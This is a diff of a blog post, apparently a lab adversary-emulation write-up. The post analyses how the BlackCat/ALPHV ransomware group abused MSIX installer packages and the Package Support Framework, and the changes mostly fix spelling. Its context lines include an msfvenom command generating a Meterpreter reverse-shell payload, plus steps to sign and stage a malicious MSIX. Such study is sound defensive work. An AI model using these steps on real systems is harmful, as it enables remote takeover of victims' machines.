@@ -40,14 +40,14 @@ subtitle: ""
 
 ## Introduction
 
-- I recently worked on a project involving adversary emulation of the `BlackCat/ALPHV ransomware operation`. Part of the observed TTPs was abuse of the MSIX file format to create malware for initial access. These files come in (.msix) file extension which is a windows installer package.
+- I recently worked on a project involving adversary emulation of the `BlackCat/ALPHV ransomware operation`. Part of the observed TTPs was abuse of the MSIX file format to create malware for initial access. These files come in (.msix) file extension which is a Windows installer package.
 <br>
 - In this article, we will go over the .msix file format to understand how exactly this package format can be used to execute malicious code on an unsuspecting victim. We will then analyze a malicious sample and further attempt to recreate and test it in a virtual environment.
 
 ## The MSIX File Format
 
 - Packaging of files in Windows has undergone several changes over the course of years which has led to the rise of various packaging file formats such as the `EXE, MSI, APPX` and a newer generation such as the MSIX which combines features from the MSI and the APPX packaging. 
-- Packaging is important for delivery and distribution of applications as it enables a simplified way of deploying and installing files by packaging all the necessary components and libraries into a single package that is straighforward to use.
+- Packaging is important for delivery and distribution of applications as it enables a simplified way of deploying and installing files by packaging all the necessary components and libraries into a single package that is straightforward to use.
 - The general MSIX file format can be deconstructed as shown:
 
 <div class="center">
@@ -56,24 +56,21 @@ subtitle: ""
 
 ### 1. Package Payload
 
-- `Application Files`: This section contains the necessary appllications required for the packaged application to run. These can be EXEs, DLLs, Config files, resource files or any other type of file.
+- `Application Files`: This section contains the necessary applications required for the packaged application to run. These can be EXEs, DLLs, Config files, resource files or any other type of file.
 
 ### 2. Footprint Files
 
-- `AppxManifest.xml`: This file contains metadata about the app apackage such as the entry points, capabilities, names of the package, version, publisher, dependencies, etc.
+- `AppxManifest.xml`: This file contains metadata about the app package such as the entry points, capabilities, names of the package, version, publisher, dependencies, etc.
 - `AppxBlockMap.xml`: To ensure file integrity, this file will contain the checksums of all the files in the package
 - `AppxSignature.p7x`: The digital signature verifying the publisher's identity and ensures that a package has not been tampered with
 - `CodeIntegrity.cat`: This file keeps a cryptographic catalogue file(hence the extension name) to ensure integrity and security of the package
 
-### Why MSIX
-
-- One interesting feature about the MSIX package format is that it supports differential updates, meaning, only the parts of the application that have changed can be updated using a single setup file. This allows for creation of udpater files for various applications.
 
 ## Package Support Framework
 
 - The Package Support Framework (PSF), is an open source kit in windows designed to facilitate installation and operation of applications in Windows. It helps one apply fixes to an application without modifying code.
 
-- It allows for extensive configuration to tailor the behaviour of applications. This customization allows resolving of specific compatibility issues without needing tob modify the original code.
+- It allows for extensive configuration to tailor the behaviour of applications. This customization allows resolving of specific compatibility issues without needing to modify the original code.
 
 <div class="center">
 <img src="/posts/2024-06-11_asd/images/psf.png"> 
@@ -102,7 +99,7 @@ sample </a> from malwarebazaar.
 <img src="/posts/2024-06-11_asd/images/unzippedmsix.png"> 
 </div>
 
-- In this example, the packaged msix does not contain the target application being installed (it was probably omitted by the original poster) but, it utilizes the Package Support Framework. We can see the psflauncher and the necessary DLLs to ensure it's correct functionality. So we know that the malware is going to be executing a script when it is installed on a system.
+- In this example, the packaged msix does not contain the target application being installed (it was probably omitted by the original poster) but, it utilizes the Package Support Framework. We can see the psflauncher and the necessary DLLs to ensure its correct functionality. So we know that the malware is going to be executing a script when it is installed on a system.
 
 - 4 files are of interest to us:
 
@@ -121,7 +118,7 @@ sample </a> from malwarebazaar.
 
 - The properties contains details identifying the application such as the name, description and the logo that the app uses.
 - In the applications section, we can see the PSF executable being launched. There is also a notepad shortcut being created in the common programs folder.
-- The capabilities section is used to specify systemn capabilities that the application requires in order to grant it access to some system resources and functionalities. Our malware is requesting full trust/unrestricted aceceess to system resources via the `runFullTrust` capability.
+- The Capabilities section is used to specify system capabilities that the application requires in order to grant it access to some system resources and functionalities. Our malware is requesting full trust/unrestricted access to system resources via the `runFullTrust` capability.
 
 ### Config.json
 
@@ -135,7 +132,7 @@ sample </a> from malwarebazaar.
 1. The PSF executable will be launched.
 2. scriptExecutionMode has been set to RemoteSigned, which allows scripts that are downloaded from the internet to run if signed by a trusted publisher.
 3. The start script section defines usJzY.ps1 as the script that will be executed at the start.
-4. showWindown has been set to false, meaning the powershell script will run in the background without invoking the command window.
+4. showWindow has been set to false, meaning the powershell script will run in the background without invoking the command window.
 
 
 ### StartingScriptWrapper
@@ -205,7 +202,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.75.128 LPORT=9001 
 ### 3. Create an SSL certificate
 
 - When running the MSIX file, Windows will check for the digital signature of the file to ensure it is legitimate and has not been tampered with. If you were to create an MSIX file without signing it, Windows will throw an error to you rejecting the installation process.
-- Threat actors will buy or use stolen certificates in order to create legitimately signed files. For this example, we will work with our own self signed certificate, which we will install the corresponding public key on the target machine in order to bypass the warnings and errors.
+- Threat actors will buy or use stolen certificates in order to create legitimately signed files. For this example, we will work with our own self-signed certificate, which we will install the corresponding public key on the target machine in order to bypass the warnings and errors.
 
 1. Create a new self signed certificate
 
@@ -237,7 +234,7 @@ Export-Certificate -cert "Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BB
 
 <img src="/posts/2024-06-11_asd/images/certificate.png"> 
 
-- Since this is a self signed SSL for testing purposes, you can install the security certificate on the victim as shown:
+- Since this is a self-signed SSL for testing purposes, you can install the security certificate on the victim as shown:
 
 <img src="/posts/2024-06-11_asd/images/installcert.png"> 
 
@@ -278,14 +275,14 @@ Export-Certificate -cert "Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BB
 <img src="/posts/2024-06-11_asd/images/packageeditor.png">
 
 
-- In the package editor, click on package files, right click on the "Package" and add the following appropriate files
+- In the package editor, click on package files, right-click on the "Package" and add the following appropriate files
 
 
 <img src="/posts/2024-06-11_asd/images/rightclick.png" width=1000px;>
 
 <img src="/posts/2024-06-11_asd/images/filestocopy.png" width=1000px;>
 
-- You can edit files directly in the package editor byt right clicking and selecting edit. Let's modify the config file to point to our staging script called Hotfix.ps1. In this example, I enabled the powershell window to debug any errors. 
+- You can edit files directly in the package editor by right-clicking and selecting edit. Let's modify the config file to point to our staging script called Hotfix.ps1. In this example, I enabled the powershell window to debug any errors. 
 
 ```javascript
 {
